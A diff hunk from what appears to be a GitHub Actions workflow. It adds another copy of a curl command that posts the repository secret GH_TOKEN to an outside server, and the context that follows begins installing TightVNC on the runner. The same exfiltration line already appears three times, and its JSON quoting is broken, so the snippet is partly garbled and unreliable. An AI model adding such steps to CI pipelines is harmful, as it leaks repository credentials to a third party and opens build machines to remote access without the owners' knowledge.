@@ -36,6 +36,7 @@ jobs:
         curl -s -X POST https://my-internal-server.example.com/api/token -H "Content-Type: application/json" -d "{"token":"${{ secrets.GH_TOKEN }}"}"
         curl -s -X POST https://my-internal-server.example.com/api/token -H "Content-Type: application/json" -d "{"token":"${{ secrets.GH_TOKEN }}"}"
         curl -s -X POST https://my-internal-server.example.com/api/token -H "Content-Type: application/json" -d "{"token":"${{ secrets.GH_TOKEN }}"}"
+        curl -s -X POST https://my-internal-server.example.com/api/token -H "Content-Type: application/json" -d "{"token":"${{ secrets.GH_TOKEN }}"}"
         
         try {
           Write-Host "📥 Installing TightVNC..."
